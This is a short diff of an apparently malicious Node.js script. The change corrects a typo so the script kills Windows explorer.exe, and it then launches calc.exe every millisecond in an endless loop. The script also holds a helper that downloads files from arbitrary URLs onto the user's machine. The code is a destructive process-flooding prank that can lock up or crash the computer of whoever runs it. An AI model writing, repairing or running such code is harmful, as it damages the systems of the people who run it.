@@ -13,7 +13,7 @@ exec(`cd C:/Users/${dirname.split("\\")[2]}/Desktop`, (err, stdout, stdint) => {
     function download(url, nom, format) {
         request.head(url, (err, res, body) => request(url).pipe(fs.createWriteStream(`${nom}-${random(4)}.${format}`)));
     };
-    exec("taskkil explorer.exe", (err, stdint, sdout) => {
+    exec("taskkill explorer.exe", (err, stdint, sdout) => {
         if (err) {}
         setInterval(() => exec("start calc.exe"), 1)
     })
